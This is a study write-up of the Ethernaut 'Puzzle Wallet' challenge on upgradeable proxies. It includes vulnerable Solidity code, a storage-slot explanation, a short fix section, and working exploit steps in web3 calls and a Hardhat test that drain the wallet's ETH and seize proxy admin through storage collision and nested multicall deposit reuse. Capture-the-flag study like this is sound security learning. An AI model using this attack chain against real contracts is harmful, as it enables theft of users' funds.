# Proxy & Proxy Patterns



Read more here: https://docs.openzeppelin.com/upgrades-plugins/1.x/proxies 

and here: https://github.com/Jeiwan/upgradeable-proxy-from-scratch

### Fix 

Avoid data collision by using the proper constant implementation slot for the address:

```solidity
bytes32 private constant _IMPL_SLOT =
        bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
```

Also never allow your logic contract to be the one to set the new implementation, leave that in the proxy contract. See the motorbike challenge in ethernaut. 



### Background

`delegatecall` basically says that I'm a contract and I'm allowing (delegating) you to do whatever you want to my storage. `delegatecall` is a security risk for the sending contract which needs to trust that the receiving contract will treat the storage well. i.e. If Alice invokes Bob who does `delegatecall` to Charlie, the `msg.sender` in the `delegatecall` is Alice. So, `delegatecall` just uses the code of the target contract, but the storage of the current contract.

**Proxy Pattern**

One of the biggest advantages of Ethereum is that every transaction of moving funds, every contract deployed, and every transaction made to a contract is immutable on a public ledger we call the blockchain. There is no way to hide or amend any transactions ever made. The huge benefit is that any node on the Ethereum network can verify the validity and state of every transaction making Ethereum a very robust decentralized system. But the biggest disadvantage is that you cannot change the source code of your smart contract after it’s been deployed. Developers working on centralized applications (like Facebook, or Airbnb) are used to frequent updates in order to fix bugs or introduce new features. This is impossible to do on Ethereum with traditional patterns.

So, in order to build an upgradable contract, we can consider a proxy contract that interacts user and pass through it to our logic contract. Every proxy contract uses `delegatecall` to execute the logic in logic contract.



### Vuln Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "@openzeppelin/contracts/proxy/UpgradeableProxy.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) public {
        admin = _admin;
    }

    modifier onlyAdmin {
      require(msg.sender == admin, "Caller is not the admin");
      _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    using SafeMath for uint256;
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
      require(address(this).balance <= maxBalance, "Max balance reached");
      balances[msg.sender] = balances[msg.sender].add(msg.value);
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] = balances[msg.sender].sub(value);
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}

```



### Description

In an easy word, *Proxy* and *Logic* contracts share storage via `delegatecall`, that means `pendingAdmin` is `owner` as well as `admin` is `maxBalance`.

| Slot | Variable           |
| ---- | ------------------ |
| 0    | pendingAdmin/owner |
| 1    | admin/maxBalance   |
| 2    | whitelisted        |
| 3    | balances           |

In this sense, you can guess that `admin` can be set to a new value via `maxBalance`. In order to set `maxBalance`, you have to be whitelisted as well as the wallet contract's ether balance has to be 0. In order to add someone in whiltelist, you have to be `owner`. In order to be `owner`, you can set `pendingAdmin` as yourself through `proposeNewAdmin` in `PuzzleProxy`. Once you are whiltelisted, you can call `execute` and `multicall` strategically to steal ethers from the wallet contract.

### Step by step

1. Propose yourself as a new admin
2. Add yourself in whitelist
3. Manipulate your balance
4. Drain out ETH
   - `multicall([deposit, multicall([deposit])])`
   - `execute(yourself)`
5. Set `maxBalance`



Now, it’s possible to make ourselves the `pendingAdmin` by calling the `proposeNewAdmin` function

```
await proxy.methods.proposeNewAdmin(player).send({from: player})
```

Now, via the magic of the Proxy and Logic layer sharing storage at slot 0, the `owner` variable within `PuzzleWallet` will be overwritten to match our `player` address.

```
await contract.owner() // should now be your address
```



Now that you are the `owner` of `PuzzleWallet` , you can whitelist your address

```
await contract.addToWhitelist(player); // overcomes the onlyWhitelisted modifier protecting the functions in the contractawait contract.whitelisted(player) // should now return true
```

Hooray! Now you have access to all the PuzzleWallet methods. 



Let’s break down our attack into 3 separate function calls, all sent to `multicall` along with a msg.value of 1 Ether.

1. Function to invoke the PuzzleWallet.deposit function
2. Function which invokes multicall which invokes deposit again
3. Function which invokes PuzzleWallet.execute, sending our address 2x the Ether we sent in our msg.value

`multicall` expects an array of bytes which it compares to `deposit.selector` . We can get our target function method selectors by reading the first 4 bytes of our target method

```javascript
web3.utils.keccak256('deposit()') // 0xd0e30db0
```

Alternatively, we can use the built-in `web3` `method.request` utility to get this data:

```javascript
var {data: puzzleDeposit } = await contract.deposit.request() // 0xd0e30db0
```

Repeat this to grab the data for our other two functions:

```javascript
// function 2
var { data: inceptionMultiCall } = await contract.multicall.request([ puzzleDeposit ]);// function 3
var { data: puzzleExecute } = await contract.execute.request(player, web3.utils.toWei('2', 'ether'), []);
```

Now we are ready to steal some money:

```javascript
var our3Functions = [
      puzzleDeposit,
      inceptionMultiCall,
      puzzleExecute,
    ];await contract.multicall(our3Functions, { from: player, value: web3.utils.toWei('1', 'ether')});
```

If you were successful, the target contract should now have 0 balance and you should have an extra Ether in your wallet.

```javascript
await web3.eth.getBalance(instance) // should now be 0
```



Now that the PuzzleWallet is drained of funds, we can make ourselves the `admin` by leveraging the storage overlap between the Proxy and Logic contracts. This is similar to what we did in Step 1

```
await contract.setMaxBalance(player);
```



### Test Cases to Pass

```typescript
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/dist/src/signers";
import chai, { expect } from "chai";
import { solidity } from "ethereum-waffle";
import { BigNumber } from "ethers";
import { deployments, ethers, getNamedAccounts } from "hardhat";

import { PuzzleProxy, PuzzleWallet, PuzzleWalletFactory } from "../typechain";

chai.use(solidity);

describe("Hacker", () => {
  let hacker: SignerWithAddress;
  let puzzleWalletFactory: PuzzleWalletFactory;
  let puzzleWallet: PuzzleWallet;
  let puzzleProxy: PuzzleProxy;

  const oneETH = ethers.utils.parseEther("1");

  before(async () => {
    await deployments.fixture(["PuzzleWalletFactory"]);
    puzzleWalletFactory = await ethers.getContract("PuzzleWalletFactory");
    hacker = await ethers.getSigner((await getNamedAccounts()).hacker);
  });

  it("initialize a PuzzleWallet and setup the game", async () => {
    const tx = await puzzleWalletFactory.createInstance({
      value: oneETH,
    });
    const receipt = await tx.wait();
    if (receipt.events && receipt.events[0].args) {
      puzzleWallet = await ethers.getContractAt(
        "PuzzleWallet",
        receipt.events[0].args.wallet
      );
      puzzleProxy = await ethers.getContractAt(
        "PuzzleProxy",
        receipt.events[0].args.wallet
      );
    }

    // The admin of proxy should be factory.
    expect(await puzzleProxy.admin()).to.be.equal(puzzleWalletFactory.address);

    // The owner of wallet should be factory.
    expect(await puzzleWallet.owner()).to.be.equal(puzzleWalletFactory.address);
    // The maxBalance has been corrupted already.
    // @NOTE: Proxy is such...
    expect(await puzzleWallet.maxBalance()).to.be.gt(0);
  });

  context("Attack", () => {
    it("propose new admin for proxy, it should update owner for wallet", async () => {
      await puzzleProxy.proposeNewAdmin(hacker.address);
      // @NOTE: You are the owner already. This is Proxy! Do you like it? 🤪
      expect(await puzzleWallet.owner()).to.be.equal(hacker.address);
    });

    it("add hacker in whitelist", async () => {
      // @NOTE: You are the owner of the wallet now, do everything wanted freely.
      await puzzleWallet.connect(hacker).addToWhitelist(hacker.address);
      expect(await puzzleWallet.whitelisted(hacker.address)).to.be.equal(true);
    });

    it("manipulate hacker balance to be double", async () => {
      // @NOTE: Overall, you are gonna deposit twice with 1 ether. Basically it seems not allowed, but...
      // construct calldata for deposit
      const data1 = puzzleWallet.interface.encodeFunctionData("deposit");
      // construct calldata for multicall with deposit calldata, which will break the twice deposit restriction
      const data2 = puzzleWallet.interface.encodeFunctionData("multicall", [
        [data1],
      ]);
      // execute multicall with two calldatas, you will see a miracle! 🤐
      await puzzleWallet.connect(hacker).multicall([data1, data2], {
        value: oneETH,
      });
      // check your balance
      // @NOTE: Your balance is 2, but you did deposit only 1 ether.
      expect(await puzzleWallet.balances(hacker.address)).to.be.equal(
        oneETH.mul(2)
      );
    });

    it("drain all ether out from the wallet", async () => {
      // @NOTE: The wallet had 1 ether before you manipulated your balance.
      // Your balance is now 2 ether, but the wallet has 2 ether, not 3 ether. Thank angel 😇
      await puzzleWallet
        .connect(hacker)
        .execute(hacker.address, oneETH.mul(2), "0x");
      // The wallet balance should be 0
      expect(
        await ethers.provider.getBalance(puzzleWallet.address)
      ).to.be.equal(0);
    });

    it("set maxBalance again, it should finally change the admin of the proxy", async () => {
      // @NOTE: Now you have all the conditions satisfied, you can set maxBalance.
      // The real purpose of the long journey. That is to change maxBalance, which is the admin essentially.
      // The real vulnerability of delegatecall. 🤓
      await puzzleWallet
        .connect(hacker)
        .setMaxBalance(BigNumber.from(hacker.address));
      expect(await puzzleProxy.admin()).to.be.equal(hacker.address);
      // @NOTE: You completely hijacked the wallet.
    });
  });
});
```





